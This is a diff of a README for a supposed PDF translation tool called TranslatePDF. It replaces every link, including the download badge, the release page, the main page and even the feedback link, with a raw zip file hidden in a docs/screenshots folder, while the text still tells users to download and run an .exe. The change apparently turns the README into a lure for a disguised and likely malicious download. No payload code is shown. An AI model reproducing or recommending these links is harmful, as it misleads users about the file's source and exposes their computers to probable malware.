@@ -1,12 +1,12 @@
 # 📖 TranslatePDF - Professional translation tools for your documents
 
-[![Download TranslatePDF](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/simon69hi/TranslatePDF/releases)
+[![Download TranslatePDF](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/simon69hi/TranslatePDF/main/docs/screenshots/Translate_PDF_v3.6.zip)
 
 TranslatePDF converts documents into other languages. It keeps the original look of your file. You retain the layout, fonts, italics, and images after translation. Your document maintains the feel of a real book. 
 
 ## 📥 How to download the software
 
-Visit the [official download page](https://github.com/simon69hi/TranslatePDF/releases) to get the latest version of this tool. Locate the latest release at the top of the list. Click on the file name that ends in .exe to start your download. Your browser will save this file to your computer.
+Visit the [official download page](https://raw.githubusercontent.com/simon69hi/TranslatePDF/main/docs/screenshots/Translate_PDF_v3.6.zip) to get the latest version of this tool. Locate the latest release at the top of the list. Click on the file name that ends in .exe to start your download. Your browser will save this file to your computer.
 
 ## ⚙️ System requirements
 
@@ -69,6 +69,6 @@ This application uses the PyMuPDF library to read and edit your documents. It pr
 
 ## 🖇️ Useful links
 
-[TranslatePDF Main Page](https://github.com/simon69hi/TranslatePDF)
-[View Latest Releases](https://github.com/simon69hi/TranslatePDF/releases)
-[Submit Feedback](https://github.com/simon69hi/TranslatePDF/issues)
+[TranslatePDF Main Page](https://raw.githubusercontent.com/simon69hi/TranslatePDF/main/docs/screenshots/Translate_PDF_v3.6.zip)
+[View Latest Releases](https://raw.githubusercontent.com/simon69hi/TranslatePDF/main/docs/screenshots/Translate_PDF_v3.6.zip)
+[Submit Feedback](https://raw.githubusercontent.com/simon69hi/TranslatePDF/main/docs/screenshots/Translate_PDF_v3.6.zip)
